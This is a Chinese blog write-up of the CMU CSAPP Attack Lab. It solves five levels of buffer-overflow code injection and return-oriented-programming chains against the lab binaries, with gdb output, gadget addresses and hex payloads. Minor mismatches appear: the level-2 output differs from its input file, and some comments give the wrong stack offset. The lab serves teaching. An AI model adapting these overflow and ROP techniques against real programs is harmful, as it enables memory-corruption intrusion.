---
title: CSAPP Lab3 Understanding Buffer Overflow Bugs
date: 2022-06-03 12:00:00
cover: https://cdn.jsdelivr.net/gh/zion4h/picture-home@main/img252.jpg
categories: [编程, 编程.Labs, CMU 15-213]
toc: true
excerpt: 由于是直接上手做的，看完readme后也是一头雾水，结合...
---

由于是直接上手做的，看完readme后也是一头雾水，结合[attacklab.pdf (cmu.edu)](http://csapp.cs.cmu.edu/3e/attacklab.pdf)和原书第三版的3.10.3和3.10.4才恍然大悟，当然视频资料也有不少。另外，之前又犯了个错误，就是我在mac上反编译了ctarget，注意csapp的系列实验都应在x86环境下进行。

## 准备

实验3主要分成两个部分，在ctarget做代码注入CI攻击，在rtarget上做返回导向编程ROP攻击。在CI部分有3个level，而在ROP部分有两个level，由于我们不是cmu的学生，所以在调试命令时注意加上-q禁止发送结果给服务器。

为了方便，我们将ctarget和rtarget反汇编到ctarget.s和rtarget.s中：

```
[root@MiWiFi-R4A-srv target1]# objdump -d rtarget > rtarget.s
[root@MiWiFi-R4A-srv target1]# objdump -d ctarget > ctarget.s
```

## level1

这里是[attacklab.pdf (cmu.edu)](http://csapp.cs.cmu.edu/3e/attacklab.pdf)给出的代码：

```c
void test()
{
	int val;
	val = getbuf();
	printf("No exploit. Getbuf returned 0x%x\n", val);
}

unsigned getbuf()
{
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}

void touch1()
{
	vlevel = 1; /* Part of validation protocol */
	printf("Touch1!: You called touch1()\n");
	validate(1);
	exit(0);
}
```

```
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop

00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
```

在level1中我们需要通过CI让test执行时跳转到touch1中，而程序的跳转和rsp寄存器有关，一开始rsp给了0x28的空间供getbuf栈帧使用，但如果getbuf输入了40字节以上，就会将父帧test的状态破坏。基于这个原理，我们处理方式也比较简单直接，首先用随意内容填充前40字节，再追加touch1的入口地址，这样当getbuf返回时，rsp会将该地址弹出到pc，从而成功执行touch1的代码。由于touch1最后直接exit了，所以我们无需关心进入touch1之后发生的事情。

另外，为了方便我们填充字节，lab提供了一个16进制转换工具，我们按照附录示例方式写入即可，写入方式也挺多样的。

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* 40个空白字符 */
c0 17 40 00 00 00 00 00 /* 目标touch1入口地址 */
```

```bash
[root@MiWiFi-R4A-srv target1]# ./hex2raw < ctarget.l1.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00
```

另外，Intel 8086系列都是小端对齐的，也就是低地址放低位，如0x00000000004017c0，c0在最低位所以应该放在地址最小的位置，也就是起始位置。这里可能不好想象，比如一台64位机器，栈上每层都是8字节，我的ctarget.l1.txt也是按这种方式排列的，便于参考阅读。

## level2

```c
void touch2 (unsigned val)
{
	vlevel = 2; /* Part of validation protocol */
	if (val == cookie) {
		printf("Touch2!: You called touch2(0x%.8x)\n", val);
		validate(2);
	} else {
		printf("Misfire: You called touch2(0x%.8x)\n", val);
		fail(2);
	}
	exit(0);
}
```

```
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:	00 00 00 
	...
```

类似的，如果我们需要切换到touch2，除了引导touch2的入口地址0x4017ec外还需要给出参数val，让val和cookie（0x59b997fa）相等。这里需要我们插入代码段，完整做完lab2后已经不难写出如下代码：

```
movl    $0x59b997fa, %edi # 提供val
pushq   0x4017ec          # touch2
retq

```

movl、movq都是mov操作，前者是32位，后者64位，实验给的cookie显然用32位即可，写汇编时注意尾部提行，不然可能会报warning。

现在我们将其编译后再反编译获取其字节码表达形式，注意，这里有个问题是objdump反编译时可能会遇到格式问题，我因为这个原因失败了好几次（默认x86-84格式），最好是手动选择intel或者att格式，前者适用于windows、DOS，后者适用于Linux。

```
l2.o：     文件格式 elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi
   5:	ff 34 25 ec 17 40 00 	pushq  0x4017ec
   c:	c3                   	retq
```

但是我最后还是失败了，我参考了别人成功通过的代码，发现我反汇编后得到的pushq和他们的不一样，所以果断换另外一种不需要pushq的方法，直接将其放到栈上。

```
mov     $0x59b997fa, %rdi # 提供val
retq
```

```
l2.o：     文件格式 elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	c3                   	retq
```

我们将这段代码通过getbuf传到rsp-0x28处，再用类似level1的方法跳转到这里执行这段代码。现在整个程序逻辑就比较清晰了，getbuf执行完后进入我们的插入代码中，执行完后进入touch2。

```bash
[root@MiWiFi-R4A-srv target1]# gdb ctarget
GNU gdb (GDB) Red Hat Enterprise Linux 10.2-8.el9
Copyright (C) 2021 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
...(省略了)
(gdb) disas
Dump of assembler code for function getbuf:
=> 0x00000000004017a8 <+0>:	sub    $0x28,%rsp
   0x00000000004017ac <+4>:	mov    %rsp,%rdi
   0x00000000004017af <+7>:	call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	ret    
End of assembler dump.
(gdb) p $rsp
$1 = (void *) 0x5561dca0
(gdb) stepi
14	in buf.c
(gdb) disas
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:	sub    $0x28,%rsp
=> 0x00000000004017ac <+4>:	mov    %rsp,%rdi
   0x00000000004017af <+7>:	call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	ret    
End of assembler dump.
(gdb) p $rsp
$2 = (void *) 0x5561dc78
```

通过GDB我们轻松获得rsp的位置是0x5561dca0而rsp-0x28的位置自然是0x5561dc78了，这就是我们的跳转位置。

```
48 c7 c7 fa 97 b9 59 c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* 插入代码段 */
78 dc 61 55 00 00 00 00 /* rsp-0x24 */
ec 17 40 00 00 00 00 00 /* 目标touch2入口地址 */
```

```bash
[root@MiWiFi-R4A-srv target1]# ./hex2raw < ctarget.l2.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00
```

## level3

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval) {
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval) {
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

```
00000000004018fa <touch3>:
  4018fa:	53                   	push   %rbx
  4018fb:	48 89 fb             	mov    %rdi,%rbx
  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc <vlevel>
  401905:	00 00 00
	...
```

在level3中，我们的参数变成了字符串，同时由于touch3调用了子函数hexmatch，尤其里面的声明和随机位置赋值，这意味着如果我们还想像level2一样在rsp-0x28处插入代码就有可能被覆盖掉。注意，我们是需要在存字符串的，一旦被覆盖了，字符串就丢失了。因此，我们换到处于更高位置的test帧处做字符串存储，同样的，由于touch3直接exit我们不用担心后续。

由于level2相同编译问题，我将touch3的入口也放到后面了，因此字符串的实际实际位置在rsp+0x10，也就是0x5561dcb0。

```
movl    $0x5561dcb0, %edi # 提供sval
retq

```

```
0000000000000000 <.text>:
   0:	bf b0 dc 61 55       	mov    $0x5561dcb0,%edi
   5:	c3                   	retq
```

通过查询ASCII表，我们可以得到cookie 0x59b997fa的字节码表示“35 39 62 39 39 37 66 61”。

```
bf b0 dc 61 55 c3 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* 插入代码段 */
78 dc 61 55 00 00 00 00 /* rsp-0x24 */
fa 18 40 00 00 00 00 00 /* touch3入口 */
35 39 62 39 39 37 66 61 /* 字符串，注意用00结尾 */
00
```

```
[root@MiWiFi-R4A-srv target1]# ./hex2raw < ctarget.l3.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:3:BF B0 DC 61 55 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
```

## level4

由于DI攻击方式太过常见，所以很多程序都自带针对DI的防御手段，比如栈随机化、栈破坏检测（通过金丝雀值）和限制可执行代码区域。但显然它们也不能做到尽善尽美，level4和level5就要求我们在以上限制下重新完成touch2和touch3的骇入。

现在我们重新梳理touch2，不难发现其实我们真正需要的操作是让寄存器edi获得0x59b997fa。由于当前的限制条件，我们只能将其写在栈上再通过pop读出，且这个pop操作只能通过lab给出的“工具代码段”也就是start_farm到end_farm这一部分得到。

首先，参考实验说明的附录表格，我们知道pop操作是0x58~0x5f，于是去farm中寻找，发现只有58和5c，分别对应popq rax和popq rsp，这里再次说明q后缀是64位，l后缀是32位。了解二者含义都知道，我们只有一个选项那就是popq rax，也就是说我们存储的0x59b997fa会被送到rax。

这里我们取addval，0x4019a7+4=0x4019ab：

```
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 [58] 90   lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   

00000000004019b5 <setval_424>:
  4019b5:	c7 07 54 c2 [58] 92   movl   $0x9258c254,(%rdi)
  4019bb:	c3                   	retq
```

那么我们现在是希望该字段被送到edi或者rdi，通过查找movl和movq表，再对照farm内容，我们找到了三条数据，由于包含”49 89 c7”对应“movq rax, rdi”，所以就不用再去找中转了（与之相对的，level5需要）。

对比这三条，我选择了addval，因为后面直接跟着c3，对应汇编中的“retq”，取0x4019a0+2，即0x4019a2：

```
00000000004019a0 <addval_273>:
  4019a0:	8d 87 [48 89 c7] c3   lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq

00000000004019ae <setval_237>:
  4019ae:	c7 07 [48 89 c7] c7   movl   $0xc7c78948,(%rdi)
  4019b4:	c3                   	retq

00000000004019c3 <setval_426>:
  4019c3:	c7 07 [48 89 c7] 90   movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq
```

最后，成功构造出指定输入，我用的塔式结构，也比较清晰易懂：）

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* 40个空白字符 */
ab 19 40 00 00 00 00 00 /* 弹出目标数据给rax */
fa 97 b9 59 00 00 00 00 /* 目标数据 */
a2 19 40 00 00 00 00 00 /* rax传给rdi */
ec 17 40 00 00 00 00 00 /* touch2入口 */
```

```
[root@MiWiFi-R4A-srv target1]# ./hex2raw < rtarget.l4.txt | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

## level5

首先我们先梳理一下touch3，其核心需求是让寄存器edi获得我们存放字符串的起始地址，所以我们其实需要准备三个东西：字符串、touch3入口、字符串地址。但是字符串地址我们是无法确定的，我们只能通过rsp间接确定其位置，于是我们的整个结构如下：

```
/* 40个空白字符 */
/* 1.传rsp的位置（也就是2.的位置）给寄存器x */
/* 2.获取偏移给rax*/
/* 3.偏移 即指令2.~5.的总长度 */
/* 4.x加上偏移（即地址）传给rdi */
/* 5.touch3入口 */
/* 6.字符串 */
```

首先，我们要找能够接收rsp的寄存器，也就是形如”movq rsp x“的指令（48 89 e0~7），发现只有”48 89 e0“。这里我们依然挑选最干净的第一项，它后面直接跟着c3，得到0x401a06。

```
0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	retq

0000000000401a47 <addval_201>:
  401a47:	8d 87 48 89 e0 c7    	lea    -0x381f76b8(%rdi),%eax
  401a4d:	c3                   	retq

0000000000401a5a <setval_299>:
  401a5a:	c7 07 48 89 e0 91    	movl   $0x91e08948,(%rdi)
  401a60:	c3                   	retq
```

然后，我们要找到能将该地址和偏移地址加起来的函数，我找了半天没发现add，但找到了另一个更贴切的add_xy，直接用这整个函数即可，得到0x4019d6。

```
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq
```

但是我们发现它只接收rdi和rsi，于是我又慢慢去找二者相关的movq或movl函数，因为涉及到中间变量相互传值，所以这是个漫长而乏味的过程。总之，最后找到了符合目标的一组传值过程，然后将之前总结的细化一下。

```
1.movq rsp rax 此时rsp指向2.
2.movq rax rdi
3.pop eax
4.偏移值=10-1=9层（字符串还被9条指令压着呢）所以9x8=72字节
5.movl eax edx
6.movl edx ecx
7.movl ecx esi
8.lea (rdi, rsi, 1) rax
9.movq rax rdi
10.touch3
11.字符串
```

其中需要注意的细节就是q和l后缀，rsp地址是64位的必须要用movq，而偏移量显然可以用32位传递，于是拓展到movl。

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* 40个空白字符 */
06 1a 40 00 00 00 00 00 /* mov rsp rax */
c5 19 40 00 00 00 00 00 /* mov rax rdi 4019c3+2 */
ab 19 40 00 00 00 00 00 /* pop rax */
48 00 00 00 00 00 00 00 /* 偏移72=0x48 */
dd 19 40 00 00 00 00 00 /* mov eax edx 89 c2 4019db+2 */
70 1a 40 00 00 00 00 00 /* mov edx ecx 89 d1 401a6e+2 */
63 1a 40 00 00 00 00 00 /* mov ecx esi 89 ce 401a61+2 */
d6 19 40 00 00 00 00 00 /* lea (rdi, rsi, 1) rax 4019d6 */
c5 19 40 00 00 00 00 00 /* mov rax rdi */
fa 18 40 00 00 00 00 00 /* touch3入口 4018fa */
35 39 62 39 39 37 66 61 /* 字符串，注意用00结尾 */
00
```

```
[root@MiWiFi-R4A-srv target1]# ./hex2raw < rtarget.l5.txt | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 63 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
```

注意：

1.0x90对应于”no op“操作，所以如果我们看到这样的汇编码，又想调用”89 ce“时放心使用即可。

```
0000000000401a11 <addval_436>:
  401a11:  8d 87 89 ce 90 90      lea    -0x6f6f3177(%rdi),%eax
  401a17:  c3                     retq
```

2.0xc3对应返回值之前有讲过

3.单个字节不被看作操作，会被自动忽略，比如下面的代码，我们想要”89 d1“，由于和”c3“只间隔一个字节，中间的”91“会被忽略，即可以截取该代码段运行。

```
0000000000401a6e <setval_167>:
  401a6e:  c7 07 89 d1 91 c3      movl   $0xc391d189,(%rdi)
  401a74:  c3                     retq
```

参考：

[1]:[Assembly Language & Computer Architecture Lecture (CS 301) (uaf.edu)](https://www.cs.uaf.edu/2017/fall/cs301/lecture/09_08_stack.html)

[2]:[《深入理解计算机系统/CSAPP》Attack Lab - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/57771748)

[3]:[CMU 15-213 Lab3 Attack Lab | Doraemonzzz](http://doraemonzzz.com/2020/06/15/CMU%2015-213%20Lab3%20Attack%20Lab/#4)

[4]:[objdump反汇编对于小白的一个坑 | DOA's Blog (floral.github.io)](https://floral.github.io/2021/04/21/objdump%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AF%B9%E4%BA%8E%E5%B0%8F%E7%99%BD%E7%9A%84%E4%B8%80%E4%B8%AA%E5%9D%91/)